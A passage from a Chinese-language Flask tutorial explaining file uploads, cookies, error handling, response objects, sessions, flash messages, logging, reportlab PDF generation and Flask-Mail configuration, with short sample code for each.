如果Flask上传的文件很小,那么会把它们储存在内存中。否则就会把它们保存到一个临时的位置(通过tempfile.gettempdir()可以得到这个位置)。但如何限制上传文件的尺寸呢？缺省情况下Flask是不限制上传文件的尺寸的。可以通过设置配置的MAX_CONTENT_LENGTH来限制文件尺寸,如果上传了大于这个尺寸的文件,Flask会抛出一个RequestEntityTooLarge异常

可以使用Flask-Uploads扩展来实现文件上传。这个扩展实现了完整的上传机制,还具有白名单功能、黑名单功能以及其他功能

</pre><textarea>
import os
from flask import Flask, flash, request, redirect, url_for
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif'}

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'static/uploads/'           # 自定义UPLOAD_FOLDER配置项,定义上传文件夹的路径
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024 # 内置MAX_CONTENT_LENGTH配置项指定要上传的文件的最大大小,单位字节

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        # check if the post request has the file part
        if 'file' not in request.files:
            flash('No file part')
            return redirect(request.url)
        file = request.files['file']
        # if user does not select file, browser also submit an empty part without filename
        if file.filename == '':
            flash('No selected file')
            return redirect(request.url)
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            # app.root_path获取app.py所在目录在文件系统中的绝对路径
            file.save(os.path.join(app.root_path, app.config['UPLOAD_FOLDER'], filename))
            return redirect(url_for('uploaded_file', filename=filename))
    return '''
    <!doctype html>
    < title>Upload new File< /title>
    < h1>Upload new File< /h1>
    < form method=post enctype=multipart/form-data>
      < input type=file name=file>
      < input type=submit value=Upload>
    < /form>
    '''

@app.route('/uploads/< filename>')
def uploaded_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

</textarea>
</div>

<div id="flask_cookie">
<h4>cookies</h4><pre>
Cookie以文本文件的形式存储在客户端的计算机上。其目的是记住和跟踪与客户使用相关的数据,以获得更好的访问者体验和网站统计信息
要访问cookies可以使用Request对象的cookies属性,请求对象的cookies属性是一个包含了客户端传输的所有cookies的字典,request.cookies属性的get()方法用于读取cookie
使用make_response()函数从视图函数的返回值获取响应对象。之后使用响应对象的set_cookie()函数来设置存储cookie
在Flask中如果使用会话,那么就不要直接使用cookies,因为会话比较安全一些。

cookies设置在响应对象上。通常只是从视图函数返回字符串, Flask会把它们转换为响应对象。如果想显式地转换,那么可以使用make_response()函数,然后再修改它。

使用延迟的请求回调方案可以在没有响应对象的情况下设置一个cookie

set_cookie(key, value='', max_age=None, expires=None, path='/', domain=None, secure=None, httponly=False)
expires参数用来设置cookie有效时间,它的值可以是datetime对象或者unix时间戳

</pre><textarea>
from flask import Flask, request, make_response, render_template_string, Response
import time
app = Flask(__name__)

@app.route('/getcookie')
def getcookie():
    print(request.cookies.__str__())

    # use cookies.get(key) instead of cookies[key] to not get a KeyError if the cookie is missing.
    username = request.cookies.get('username', 'guest')
    return 'welcome %s' % username

@app.route('/setcookie')
def setcookie():
    res = Response('setcookie page')
    res.set_cookie(key='username', value='letian', expires=time.time()+6*60)
    return res

    resp = make_response(render_template_string('setcookie page'))
    resp.set_cookie('username', 'vip')
    return resp

@app.route('/deletecookie')
def deletecookie():
    res = Response('delete cookies')
    res.set_cookie('username', '', expires=0)
    return res

if __name__ == '__main__':
    app.run(debug=True)

</textarea>
</div>

<div id="flask_error">
<h4>重定向和错误</h4>
Flask类有一个redirect()重定向函数,调用时它返回一个响应对象,并将用户重定向到具有指定状态代码的另一个目标位置
Flask.redirect(location, statuscode, response)
location参数是应该重定向响应的URL。
statuscode发送到浏览器标头,状态代码默认为302,表示'found'。
response参数用于实例化响应。

以下状态代码已标准化：
HTTP_300_MULTIPLE_CHOICES
HTTP_301_MOVED_PERMANENTLY
HTTP_302_FOUND
HTTP_303_SEE_OTHER
HTTP_304_NOT_MODIFIED
HTTP_305_USE_PROXY
HTTP_306_RESERVED
HTTP_307_TEMPORARY_REDIRECT

Flask类具有带有错误代码的abort()函数,使用abort()可以更早退出请求并返回错误代码
Flask.abort(code)
Code参数采用以下值之一：
400 - 用于错误请求
401 - 用于未身份验证的
403 - Forbidden
404 - 未不到
406 - 表示不接受
415 - 用于不支持的媒体类型
429 - 请求过多

</pre><textarea>
from flask import Flask, render_template_string, abort, redirect
app = Flask(__name__)

@app.route('/')
def index():
    return redirect(url_for('user'))

# 没有自定义错误页面则会渲染flask默认的错误页面
@app.route('/user')
def user():
    abort(401)  # Unauthorized
    this_is_never_executed()

@app.errorhandler(401)
def page_unauthorized(error):
    # 省略401则响应状态码会变成默认的200
    return render_template_string('< h1> Unauthorized < /h1>< h2>{{ error_info }}< /h2>', error_info=error), 401

if __name__ == '__main__':
    app.run(port=5000, debug=True)

</textarea>

<h4>错误处理</h4><pre>
当错误发生时可能想要向用户显示自定义的出错页面。注册出错处理器或以做到这点。
一个出错处理器是一个返回响应的普通视图函数。但是不同之在于它不是用于路由的,而是用于一个异常或当尝试处理请求时抛出HTTP状态码

【 注册 】
通过使用errorhandler()装饰函数来注册或者稍后使用register_error_handler()来注册。记得当返回响应的时候设置出错代码:

</pre>默认每种出错代码都会对应显示一个黑白的出错页面,使用errorhandler()装饰器可以定制出错页面<textarea>
from flask import render_template

@app.errorhandler(404)
def page_not_found(error):
    return render_template('page_not_found.html'), 404

</textarea><textarea>
@app.errorhandler(werkzeug.exceptions.BadRequest)
def handle_bad_request(e):
    return 'bad request!', 400

# or, without the decorator
app.register_error_handler(400, handle_bad_request)

</textarea><pre>
当注册时werkzeug.exceptions.HTTPException的子类如BadRequest,和它们的HTTP代码是可替换的,BadRequest.code == 400

因为Werkzeug无法识别非标准HTTP代码,因此它们不能被注册。替代地,使用适当的代码定义一个HTTPException子类,注册并抛出异常类:

</pre><textarea>
class InsufficientStorage(werkzeug.exceptions.HTTPException):
    code = 507
    description = 'Not enough storage space.'

app.register_error_handler(InsufficientStorage, handle_507)

raise InsufficientStorage()

</textarea><pre>
出错处理器可被用于任何异常类的注册,除了HTTPException子类或HTTP状态码。 出错处理器可被用于特定类的注册,也可用于一个父类的所有子类的注册。

【 处理 】
在处理请求时,当Flask捕捉到一个异常时,它首先根据代码检索。如果该代码没有注册处理器,它会根据类的继承来查找,确定最合适的注册处理器。如果找不到已注册的处理器,那么HTTPException子类会显示一个关于代码的通用消息。没有代码的异常会被转化为一个通用的500内部服务器错误。

例如,如果一个ConnectionRefusedError的实例被抛出,并且一个出错处理器注册到ConnectionError和ConnectionRefusedError ,那么会使用更合适的ConnectionRefusedError来处理异常实例生成响应。

当一个蓝图在处理抛出异常的请求时,在蓝图中注册的出错处理器优先于在应用中全局注册的出错处理器。但蓝图无法处理404路由错误,因为404发生的路由级别还不能检测到蓝图。

【 通用异常处理器 】
可以为非常通用的基类注册异常处理器,例如HTTPException基类或甚至Exception基类。但这样会捕捉到超出预期的异常。

基于HTTPException的异常处理器对于把缺省的HTML出错页面转换为JSON非常有用,但这个处理器会触发不由你直接产生的东西,如路由过程中产生的404和405错误。请仔细制作你的处理器,确保不会丢失关于HTTP错误的信息。

</pre><textarea>
from flask import json
from werkzeug.exceptions import HTTPException

@app.errorhandler(HTTPException)
def handle_exception(e):
    """Return JSON instead of HTML for HTTP errors."""
    # start with the correct headers and status code from the error
    response = e.get_response()
    # replace the body with JSON
    response.data = json.dumps({
        "code": e.code,
        "name": e.name,
        "description": e.description,
    })
    response.content_type = "application/json"
    return response

</textarea><pre>
基于Exception的异常处理器有助于改变所有异常处理的表现形式,甚至包含未处理的异常。但与在Python使用except Exception: 类似,这样会捕获所有未处理的异常,包括所有HTTP状态码。因此在大多数情况下设定只针对特定异常的处理器比较安全。 因为HTTPException实例是一个合法的WSGI响应,可以直接传递该实例。

</pre><textarea>
from werkzeug.exceptions import HTTPException

@app.errorhandler(Exception)
def handle_exception(e):
    # pass through HTTP errors
    if isinstance(e, HTTPException):
        return e

    # now you're handling non-HTTP exceptions only
    return render_template("500_generic.html", e=e), 500

</textarea><pre>
异常处理器仍然遵循异常烦类的继承层次。如果同时基于HTTPException和Exception注册了异常处理器, Exception处理器不会处理HTTPException子类,因为HTTPException更有针对性。

【 未处理的异常 】
当一个异常发生时,如果没有对应的异常处理器,那么就会返回一个500内部服务错误。关于此行为的更多内容参见flask.Flask.handle_exception()

如果针为InternalServerError注册了异常处理器,那么出现内部服务错误时就会调用这个处理器。Flask 1.1.0开始总是会传递一个InternalServerError实例给这个异常处理器,而不是以前的未处理异常。原始的异常可以通过e.original_error访问。在Werkzeug 1.0.0以前这个属性只有未处理异常有。建议使用getattr访问这个属性,以保证兼容性。

</pre><textarea>
@app.errorhandler(InternalServerError)
def handle_500(e):
    original = getattr(e, "original_exception", None)

    if original is None:
        # direct 500 error, such as abort(500)
        return render_template("500.html"), 500

    # wrapped unhandled error
    return render_template("500_unhandled.html", e=original), 500

</textarea>
</div>

<div id="flask_response">
<h4>响应</h4><pre>
视图函数的返回值会自动转换为一个响应对象,以下是转换的规则：
1、如果视图返回的是一个响应对象,那么就直接返回它。
2、如果返回的是一个字符串,那么根据这个字符串和缺省参数生成一个用于返回的响应对象,那么会被转换为一个包含作为响应体的字符串、一个200 OK出错代码和一个text/html类型的响应对象
3、如果返回的是一个字典,那么调用jsonify()创建一个响应对象
4、如果返回的是一个元组,那么元组中的项目可以提供额外的信息。元组中必须至少包含一个项目,且项目应当由(response, status)、(response, headers)或(response, status, headers)组成。status的值会重载状态代码,headers是一个由额外头部值组成的列表或字典。
5、如果以上都不是,那么Flask会假定返回值是一个有效的WSGI应用并把它转换为一个响应对象。

如果想要在视图内部掌控响应对象的结果,那么可以使用make_response()函数构建响应对象

print(help(Response))
print(help(make_response))
print(Response.__doc__)
print(make_response.__doc__)

Response对象
class flask.Response(response=None,status=None,headers=None,mimetype=None,content_type=None,direct_passthrough=False)

</pre><textarea>
from werkzeug.wrappers import Response
@app.route('/about/')
def about():
    resp = Response(response='about page',status=200,content_type='text/html;charset=utf-8')
    return resp

</textarea><textarea>
from flask import make_response

# 返回内容
@app.route('/about/')
def about():
    return make_response('about page')

# 返回页面
@app.route('/index/')
def index():
    response = make_response(render_template('index.html', foo=42))
    response.headers['X-Parachutes'] = 'parachutes are cool'
    return response

@app.errorhandler(404)
def not_found(error):
    return render_template('error.html'), 404

# 可以使用make_response()包裹返回表达式,获得响应对象,并对该对象进行修改,然后再返回:
@app.errorhandler(404)
def not_found(error):
    resp = make_response(render_template('error.html'), 404) # 在make_response()中传入状态码
    resp.headers['X-Something'] = 'A value'
    return resp

# 直接return状态码
@app.errorhandler(404)
def not_found(error):
    resp = make_response(render_template('error.html'))
    resp.headers['X-Something'] = 'A value'
    return resp, 404

</textarea><textarea>
from flask import Flask, request, make_response, render_template_string, Response
import time
app = Flask(__name__)

@app.route('/')
def index():
    res = Response('show page')
    res.headers['X-Something'] = 'A value'
    return res

    resp = make_response(render_template_string('show page'))
    resp.headers['X-Something'] = 'A value'
    return resp

if __name__ == '__main__':
    app.run(debug=True)

</textarea><pre>
自定义响应
自定义响应必须满足三个条件：
1、必须继承自Response类。
2、实现类方法force_type(cls,rv,environ=None)。
3、必须指定app.response_class为你自定义的Response

</pre><textarea>
# Restful API都是通过JSON的形式进行传递,如果你的后台跟前台进行交互,所有的URL都是发送JSON数据,那么此时你可以自定义一个叫做JSONResponse的类来代替Flask自带的Response类

from flask import Flask,jsonify
from werkzeug.wrappers import Response

app = Flask(__name__)

class JSONResponse(Response):
    default_mimetype = 'application/json'

    @classmethod
    def force_type(cls,response,environ=None):
        if isinstance(response,dict):
            response = jsonify(response)
        return super(JSONResponse,cls).force_type(response,environ)

app.response_class = JSONResponse

@app.route('/about/')
def about():
    return {"message":"about page"}

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=8000)

</textarea><pre>
【 JSON格式的API 】
JSON格式的响应是常见的,用Flask写这样的API是很容易上手的。如果从视图返回一个dict,那么它会被转换为一个JSON响应。

</pre><textarea>
@app.route("/me")
def me_api():
    user = get_current_user()
    return {
        "username": user.username,
        "theme": user.theme,
        "image": url_for("user_image", filename=user.image),
    }

# 如果dict还不能满足需求,还需要创建其他类型的JSON格式响应,可以使用jsonify()函数,该函数会序列化任何支持的JSON数据类型。也可以研究研究Flask社区扩展,以支持更复杂的应用。
@app.route("/users")
def users_api():
    users = get_all_users()
    return jsonify([user.to_json() for user in users])

</textarea><textarea>
from flask import Flask, request, Response, jsonify
import json
app = Flask(__name__)

@app.route('/')
def hello_world():
    result =  {'a': 1, 'b': 2}

    # 响应json数据方式一
    return result

    # 响应json数据方式二
    resp = Response(json.dumps(result),  mimetype='application/json')
    resp.headers.add('Server', 'python flask')
    return resp

    # 响应json数据方式三
    return jsonify(result)

if __name__ == '__main__':
    app.run(debug=True)

</textarea>
</div>

<div id="flask_session">
<h4>会话session</h4><pre>
与Cookie不同,Session数据存储在服务器上,需要在该会话中保存的数据会存储在服务器上的临时目录中。
为每个客户端的会话分配会话ID,会话数据存储在cookie,服务器以加密方式对其进行签名。对于此加密,Flask应用程序需要一个定义的SECRET_KEY。
Session对象也是一个字典对象,包含会话变量和关联值的键值对

除了请求对象之外还有一种称为session的对象,允许在不同请求之间储存信息。这个对象相当于用密钥签名加密的cookie,即用户可以查看你的cookie,但是如果没有密钥就无法修改它。使用会话之前必须设置一个密钥

如何生成一个好的密钥
生成随机数的关键在于一个好的随机种子,因此一个好的密钥应当有足够的随机性。 操作系统可以有多种方式基于密码随机生成器来生成随机数据。使用下面的命令可以快捷的为Flask.secret_key或SECRET_KEY生成值:
$ python -c 'import os; print(os.urandom(16))'
b'_5#y2L"F4Q8z\n\xec]/'

基于cookie的会话的说明：Flask会取出会话对象中的值,把值序列化后储存到cookie中。在打开cookie的情况下,如果需要查找某个值,但这个值在请求中没有持续储存的话,那么不会得到一个清晰的出错信息。请检查页面响应中的cookie的大小是否与网络浏览器所支持的大小一致。

除了缺省的客户端会话之外,还有许多Flask扩展支持服务端会话。

</pre><textarea>
from flask import Flask, session, redirect, url_for, escape, request
app = Flask(__name__)

# Set the secret key to some random bytes. Keep this really secret!
app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'

@app.route('/')
def index():
    if 'username' in session:
        return 'Logged in as %s, < a href="/logout">log out< /a>' % escape(session['username']) # escape()用来转义
    return 'You are not logged in, < a href="/login">log in< /a>'

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        session['username'] = request.form['username']
        return redirect(url_for('index'))
    return '''
        < form method="post">
            < p>< input type=text name=username>< /p>
            < p>< input type=submit value=Login>< /p>
        < /form>
    '''

@app.route('/logout')
def logout():
    session.pop('username', None)  # remove the username from the session if it's there
    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=True)

</textarea><textarea>
from flask import Flask, render_template_string, session, request, redirect, url_for
app = Flask(__name__)
app.secret_key = 'F12Zr47j\3yX R~X@H!jLwf/T'

@app.route('/')
def hello_world():
    return 'hello world'

@app.route('/login')
def login():
    page = '''
    < form action="{{ url_for('do_login') }}" method="post">
        < p>name: < input type="text" name="user_name" />< /p>
        < input type="submit" value="Submit" />
    < /form>
    '''
    return render_template_string(page)

@app.route('/do_login', methods=['POST'])
def do_login():
    name = request.form.get('user_name')
    session['user_name'] = name
    return 'success'

@app.route('/show')
def show():
    return session['user_name']

@app.route('/logout')
def logout():
    session.pop('user_name', None)
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(debug=True)

</textarea>
</div>

<div id="flask_flash">
<h4>消息闪现</h4><pre>
一个好的基于GUI的应用程序会向用户提供有关交互的反馈,例如桌面应用程序使用对话框或消息框,Js使用alert用于类似目的。
Flask框架的消息闪现系统(flashing system)可以在一个视图中创建消息,并在名为next的视图函数中呈现它。闪现系统的基本工作原理是在请求结束时记录一个消息,提供且只提供给下一个请求使用。通常通过一个布局模板来展现闪现的消息。

Flask的闪存系统用于向用户提供反馈信息,这些反馈信息一般是对用户上一次操作的反馈。反馈信息是存储在服务器端的,当服务器向客户端返回反馈信息后,这些反馈信息会被服务器端删除

浏览器会限制cookie的大小,有时候网络服务器也会。这样如果消息比会话cookie大的话,那么会导致消息闪现静默失败
Flask模块包含flash()方法,它将消息传递给下一个请求,该请求通常是一个模板。

flash(message, category)
message参数是要闪现的实际消息。
category参数是可选的,默认类别为'message',可以是"error","info"或"warning",不同的类别可以给用户提供更好的反馈,例如错误消息可以使用红色背景

视图或模板调用get_flashed_messages()来操作消息,从会话中删除消息
get_flashed_messages(with_categories, category_filter)
两个参数都是可选的。如果接收到的消息具有类别则第一个参数是元组。第二个参数仅用于显示特定消息

</pre><textarea>
from flask import Flask, flash, redirect, render_template, request, url_for

app = Flask(__name__)
app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        if request.form['username'] != 'admin' or request.form['password'] != 'secret':
            error = 'Invalid credentials'
        else:
            flash('You were successfully logged in')
            return redirect(url_for('index'))
    return render_template('login.html', error=error)

### 实现闪现的layout.html模板
<!doctype html>
< title>My Application< /title>
{% with messages = get_flashed_messages() %}
  {% if messages %}
    < ul class=flashes>
    {% for message in messages %}
      < li>{{ message }}< /li>
    {% endfor %}
    < /ul>
  {% endif %}
{% endwith %}
{% block body %}{% endblock %}

### 继承自layout.html的index.html模板
{% extends "layout.html" %}
{% block body %}
  < h1>Overview< /h1>
  < p>Do you want to < a href="{{ url_for('login') }}">log in?< /a>
{% endblock %}

### 继承自layout.html的login.html模板
{% extends "layout.html" %}
{% block body %}
  < h1>Login< /h1>
  {% if error %}
    < p class=error>< strong>Error:< /strong> {{ error }}
  {% endif %}
  < form method=post>
    < dl>
      < dt>Username:
      < dd>< input type=text name=username value="{{ request.form.username }}">
      < dt>Password:
      < dd>< input type=password name=password>
    < /dl>
    < p>< input type=submit value=Login>
  < /form>
{% endblock %}

</textarea>消息的类别<textarea>
# 使用flash()函数可以指定消息的类别
flash(u'Invalid password provided', 'error')

# 模板中的get_flashed_messages()函数也应当返回类别,显示消息的循环也要略作改变
{% with messages = get_flashed_messages(with_categories=true) %}
  {% if messages %}
    < ul class=flashes>
    {% for category, message in messages %}
      < li class="{{ category }}">{{ message }}< /li>
    {% endfor %}
    < /ul>
  {% endif %}
{% endwith %}

</textarea>过滤闪现消息:可视情况通过传递一个类别列表来过滤get_flashed_messages()的结果,这个功能有助于在不同位置显示不同类别的消息<textarea>
{% with errors = get_flashed_messages(category_filter=["error"]) %}
{% if errors %}
< div class="alert-message block-message error">
  < a class="close" href="#">×< /a>
  < ul>
    {%- for msg in errors %}
    < li>{{ msg }}< /li>
    {% endfor -%}
  < /ul>
< /div>
{% endif %}
{% endwith %}

</textarea>
</div>

<div id="flask_">
<h4>日志</h4><pre>
有时候可能会遇到数据出错需要纠正的情况,例如因为用户篡改了数据或客户端代码出错而导致一个客户端代码向服务器发送了明显错误的HTTP请求。多数时候在类似情况下返回400 Bad Request就没事了,但也有不会返回的时候,而代码还得继续运行下去。
这时候就需要使用日志来记录这些不正常的东西了。从Flask 0.3后就已经配置好了一个日志工具。

以下是一些日志调用示例:
app.logger.debug('A value for debugging')
app.logger.warning('A warning occurred (%d apples)', 42)
app.logger.error('An error occurred')

Flask使用标准Python logging。所有与Flask相关的消息都用app.logger来记录,其名称与app.name相同。这个日志记录器也可用于自己的的日志记录

</pre><textarea>
@app.route('/login', methods=['POST'])
def login():
    user = get_user(request.form['username'])

    if user.check_password(request.form['password']):
        login_user(user)
        app.logger.info('%s logged in successfully', user.username)
        return redirect(url_for('index'))
    else:
        app.logger.info('%s failed to log in', user.username)
        abort(401)

</textarea><pre>
【 基本配置 】
当想要为项目配置日志时应当在程序启动时尽早进行配置,如果完了那么app.logger就会成为缺省记录器。 如果有可能的话应当在创建应用对象之前配置日志。

</pre>使用dictConfig()来创建一个类似于Flask缺省配置的日志记录配置<textarea>
from logging.config import dictConfig

dictConfig({
    'version': 1,
    'formatters': {'default': { 'format': '[%(asctime)s] %(levelname)s in %(module)s: %(message)s', }},
    'handlers': {'wsgi': {
        'class': 'logging.StreamHandler',
        'stream': 'ext://flask.logging.wsgi_errors_stream',
        'formatter': 'default'
    }},
    'root': {
        'level': 'INFO',
        'handlers': ['wsgi']
    }
})

app = Flask(__name__)

</textarea><pre>
【 缺省配置 】
如果没有自己配置日志,Flask会自动添加一个StreamHandler到app.logger。 在请求过程中它会写到由WSGI服务器指定的,保存在environ['wsgi.errors']变量中的日志流(通常是sys.stderr)中,在请求之外则会记录到sys.stderr

【 移除缺省配置 】
如果在操作app.logger之后配置日志,并且需要移除缺省的日志记录器,可以导入并移除它:
from flask.logging import default_handler
app.logger.removeHandler(default_handler)

【 把出错信息通过电子邮件发送给管理者 】
当产品运行在一个远程服务器上时,可能不会经常查看日志信息。 WSGI服务器可能会在一个文件中记录日志消息,而只会在当用户告诉你出错的时候才会查看日志文件。
为了主动发现并修复错误,可以配置一个logging.handlers.SMTPHandler用于在一般错误或更高级别错误发生时发送一封电子邮件,这需要在同一台服务器上拥有一个SMTP服务器

</pre><textarea>
import logging
from logging.handlers import SMTPHandler

mail_handler = SMTPHandler(
    mailhost='127.0.0.1',
    fromaddr='server-error@example.com',
    toaddrs=['admin@example.com'],
    subject='Application Error'
)
mail_handler.setLevel(logging.ERROR)
mail_handler.setFormatter(logging.Formatter('[%(asctime)s] %(levelname)s in %(module)s: %(message)s'))

if not app.debug:
    app.logger.addHandler(mail_handler)

</textarea><pre>
【 注入请求信息 】
看到更多请求信息如IP地址,有助调试某些错误。可以继承logging.Formatter来注入自己的内容以显示在日志消息中。然后可以修改Flask缺省的日志记录器、上文所述的电子邮件日志记录器或者其他日志记录器的格式器

</pre><textarea>
from flask import has_request_context, request
from flask.logging import default_handler

class RequestFormatter(logging.Formatter):
    def format(self, record):
        if has_request_context():
            record.url = request.url
            record.remote_addr = request.remote_addr
        else:
            record.url = None
            record.remote_addr = None

        return super().format(record)

formatter = RequestFormatter(
    '[%(asctime)s] %(remote_addr)s requested %(url)s\n'
    '%(levelname)s in %(module)s: %(message)s'
)
default_handler.setFormatter(formatter)
mail_handler.setFormatter(formatter)

</textarea><pre>
【 其他库 】
其他库可能也会产生大量日志,而你也正好需要查看这些日志。最简单的方法是向根 记录器中添加记录器。:

</pre><textarea>
from flask.logging import default_handler

root = logging.getLogger()
root.addHandler(default_handler)
root.addHandler(mail_handler)

# 单独配置每个记录器更好还是只配置一个根记录器更好,取决项目:
for logger in (
    app.logger,
    logging.getLogger('sqlalchemy'),
    logging.getLogger('other_package'),
):
    logger.addHandler(default_handler)
    logger.addHandler(mail_handler)

</textarea><pre>
Werkzeug
Werkzeug记录基本的请求/响应信息到'werkzeug'日志记录器。如果根记录器没有配置,那么Werkzeug会向记录器添加一个StreamHandler

Flask扩展
根据情况不同,一个扩展可能会选择记录到app.logger或其自己的日志记录器

</pre>
</div>

<div id="flask_pdf">
<h4>动态生成pdf</h4><pre>
Python处理PDF的包
reportlab
ReportLab标记语言(RML)是最强大的代码到PDF工具包,非常简单,是自动化专业发布的最佳选择。清晰的类似HTML的语法允许开发人员像网页一样布局数据驱动的文档
reportlab可以利用模板来生成PDF,也可以手动生成PDF
pip install reportlab

xhtml2pdf
xhtml2pdf是一个使用ReportLab Toolkit,HTML5lib和pyPdf的html2pdf转换器。它支持HTML 5和CSS 2.1以及一些CSS 3。它完全用纯Python编写,因此它与平台无关。具有Web技能(如HTML和CSS)的用户能够非常快速地生成PDF模板而无需学习新技术

PyPDF2
PyPDF2可以提取文档信息(标题,作者,…)、按页拆分文档、逐页合并文档、裁剪页面、合并多个页面到一个页、对pdf文档进行加密解密等

</pre>动态生成pdf<textarea>
from flask import Flask
from reportlab.lib.colors import HexColor
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.platypus import SimpleDocTemplate, Table, Image, PageBreak, Paragraph
from reportlab.lib.units import inch
from reportlab.lib import colors
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont

# 增加的字体,支持中文显示,需要自行下载支持中文的字体
pdfmetrics.registerFont(TTFont('SimSun', 'SimSun.ttf'))
styles = getSampleStyleSheet()
styles.add(ParagraphStyle(fontName='SimSun', name='SimSun', leading=20, fontSize=12))

def table_model():
    """添加表格"""
    new_img = Image('test.jpg', width=300, height=300)
    base = [
        [new_img, ""],
        ["大类", "小类"],
        ["WebFramework", "django"],
        ["", "flask"],
        ["", "web.py"],
        ["", "tornado"],
        ["Office", "xlsxwriter"],
        ["", "openpyxl"],
        ["", "xlrd"],
        ["", "xlwt"],
        ["", "python-docx"],
        ["", "docxtpl"],
    ]

    style = [
        # 设置字体
        ('FONTNAME', (0, 0), (-1, -1), 'SimSun'),
        # 合并单元格 (列,行)
        ('SPAN', (0, 0), (1, 0)),
        ('SPAN', (0, 2), (0, 5)),
        ('SPAN', (0, 6), (0, 11)),
        # 单元格背景
        ('BACKGROUND', (0, 1), (1, 1), HexColor('#548DD4')),
        # 字体颜色
        ('TEXTCOLOR', (0, 1), (1, 1), colors.white),
        # 对齐设置
        ('VALIGN', (0, 0), (-1, -1), 'MIDDLE'),
        ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
        # 单元格框线
        ('GRID', (0, 0), (-1, -1), 0.5, colors.grey),
        ('BOX', (0, 0), (-1, -1), 0.5, colors.black),
    ]

    component_table = Table(base, style=style)
    return component_table

def paragraph_model(msg):
    """添加一段文字"""
    # 设置文字样式
    style = ParagraphStyle(name='Normal',fontName='SimSun',fontSize=50)
    return Paragraph(msg, style=style)

def image_model():
    """添加图片"""
    new_img = Image('test.jpg', width=300, height=300)
    return new_img

def generate_pdf():
    """生成pdf"""
    path = "test.pdf"
    data = list()
    # 添加一段文字
    paragraph = paragraph_model("测试添加一段文字")
    data.append(paragraph)
    data.append(PageBreak())  # 分页标识
    # 添加table和图片
    table = table_model()
    data.append(table)
    data.append(PageBreak())  # 分页标识
    img = image_model()
    data.append(img)

    # 设置生成pdf的名字和编剧
    pdf = SimpleDocTemplate(path, rightMargin=0, leftMargin=0, topMargin=40, bottomMargin=0, )
    # 设置pdf每页的大小
    pdf.pagesize = (9 * inch, 10 * inch)

    pdf.multiBuild(data)
    return path

app = Flask(__name__)

@app.route('/testPDF', methods=["GET"])
def test_pdf():
    """测试输出pdf"""
    path = generate_pdf()
    return path

if __name__ == '__main__':
    app.run()

</textarea>
</div>

<div id="flask_wsgi">
<h4>集成WSGI中间件</h4><pre>
如果想要在应用中添加一个WSGI中间件,那么可以包装内部的WSGI应用。假设为了解决lighttpd的错误,要使用一个来自Werkzeug包的中间件,那么可以这样做:
from werkzeug.contrib.fixers import LighttpdCGIRootFix
app.wsgi_app = LighttpdCGIRootFix(app.wsgi_app)

</pre>
</div>

<div id="flask_extension">
<h4>使用Flask扩展</h4><pre>
扩展是帮助完成公共任务的包。例如Flask-SQLAlchemy为在Flask中轻松使用SQLAlchemy提供支持

Flask通常被称为微框架,因为核心功能包括基于Werkzeug的WSGI和路由以及基于Jinja2的模板引擎。此外,Flask框架还支持cookie和会话及JSON,静态文件等Web帮助程序。显然这不足以开发完整的Web应用程序。而Flask扩展就具备这样的功能。Flask扩展为Flask框架提供了可扩展性。

有大量的Flask扩展可用。Flask扩展是一个Python模块,它向Flask应用程序添加了特定类型的支持。Flask Extension Registry(Flask扩展注册表)是一个可用的扩展目录。可以通过pip实用程序下载所需的扩展名

Flask Mail - 为Flask应用程序提供SMTP接口
Flask WTF - 添加WTForms的渲染和验证
Flask SQLAlchemy - 为Flask应用程序添加SQLAlchemy支持
Flask Sijax - Sijax的接口 - Python/jQuery库,使AJAX易于在Web应用程序中使用

由于扩展是一个Python模块,因此需要导入它才能使用它,Flask扩展名通常命名为flask-foo。导入的操作如下：
from flask_foo import [class, function]
对于0.7以后的Flask版本还可以使用语法：
from flask.ext import foo
对于此用法,需要激活兼容性模块。它可以通过运行flaskext_compat.py来安装：
import flaskext_compat
flaskext_compat.activate()
from flask.ext import foo

【 Flask邮件 】
基于web的应用程序通常需要具有向用户/客户端发送邮件的功能。Flask-Mail扩展使得与任何电子邮件服务器建立简单的接口变得非常容易。

首先pip安装Flask-Mail扩展
pip install Flask-Mail

然后需要通过设置以下应用程序参数的值来配置Flask-Mail。
MAIL_SERVER: 电子邮件服务器的名称/IP地址
MAIL_PORT: 使用的服务器的端口号
MAIL_USE_TLS: 启用/禁用传输安全层加密
MAIL_USE_SSL: 启用/禁用安全套接字层加密
MAIL_DEBUG: 调试支持。默认值是Flask应用程序的调试状态
MAIL_USERNAME: 发件人的用户名
MAIL_PASSWORD: 发件人的密码
MAIL_DEFAULT_SENDER: 设置默认发件人
MAIL_MAX_EMAILS: 设置要发送的最大邮件数
MAIL_SUPPRESS_SEND: 如果app.testing设置为true,则发送被抑制
MAIL_ASCII_ATTACHMENTS: 如果设置为true,则附加的文件名将转换为ASCII

flask-mail模块包含以下重要类的定义。

Mail类
它管理电子邮件消息传递需求。类构造函数采用以下形式：
flask-mail.Mail(app = None)
构造函数将Flask应用程序对象作为参数。

Mail类的方法
send(): 发送Message类对象的内容
connect(): 打开与邮件主机的连接
send_message(): 发送消息对象

Message类
它封装了一封电子邮件。Message类构造函数有几个参数:
flask-mail.Message(subject, recipients, body, html, sender, cc, bcc,  reply-to, date, charset, extra_headers, mail_options, rcpt_options)

Message类方法
attach()
为邮件添加附件。此方法采用以下参数：,filename参数表示要附加的文件的名称,content_type参数表示MIME类型的文件,data参数表示原始文件数据,处置参数表示内容处置(如果有的话)。

add_recipient()
